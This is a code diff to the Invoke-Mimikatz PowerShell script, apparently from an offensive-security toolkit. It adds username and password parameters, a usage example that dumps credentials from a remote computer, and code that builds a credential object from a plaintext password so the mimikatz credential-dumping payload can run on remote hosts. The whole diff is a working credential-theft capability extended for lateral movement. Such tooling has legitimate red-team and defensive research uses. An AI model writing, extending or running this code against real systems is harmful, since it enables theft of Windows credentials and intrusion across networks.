@@ -39,6 +39,14 @@ Supply mimikatz a custom command line. This works exactly the same as running th
 .PARAMETER ComputerName
 
 Optional, an array of computernames to run the script on.
+
+.PARAMETER UserName
+
+Optional, A user name to use when connecting to a remote computer
+
+.PARAMETER Password
+
+Optional, A password to use when connecting to a remote computer
 	
 .EXAMPLE
 
@@ -49,6 +57,11 @@ Invoke-Mimikatz -DumpCerts
 
 Execute mimikatz on two remote computers to dump credentials.
 Invoke-Mimikatz -DumpCreds -ComputerName @("computer1", "computer2")
+
+.EXAMPLE
+
+Execute mimikatz on a remote computer using alternate creds
+Invoke-Mimikatz -DumpCreds -ComputerName computer1 -UserName user -Password password123
 
 .EXAMPLE
 
@@ -89,7 +102,15 @@ Param(
 
     [Parameter(ParameterSetName = "CustomCommand", Position = 1)]
     [String]
-    $Command
+    $Command,
+    
+    [Parameter(Mandatory = $False)]
+    [String]
+    $UserName,
+    
+    [Parameter(Mandatory = $False)]
+    [String]
+    $Password
 )
 
 Set-StrictMode -Version 2
@@ -2707,6 +2728,9 @@ Function Main
         $ExeArgs = $Command
     }
 
+
+    
+    
     [System.IO.Directory]::SetCurrentDirectory($pwd)
 
 	
@@ -2715,11 +2739,20 @@ Function Main
 
 	if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
 	{
-		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, "Void", 0, "", $ExeArgs)
+        Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, "Void", 0, "", $ExeArgs)
 	}
 	else
 	{
-		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, "Void", 0, "", $ExeArgs) -ComputerName $ComputerName
+        if ($UserName -ne $null -and $password -ne $null)
+        {
+            $SecPassword =  ConvertTo-SecureString $Password -AsPlainText -Force
+            $Creds = New-Object System.Management.Automation.PSCredential ($UserName, $SecPassword)
+            Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, "Void", 0, "", $ExeArgs) -ComputerName $ComputerName -Credential $Creds
+        }
+        else
+        {
+            Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, "Void", 0, "", $ExeArgs) -ComputerName $ComputerName
+        }
 	}
 }
 
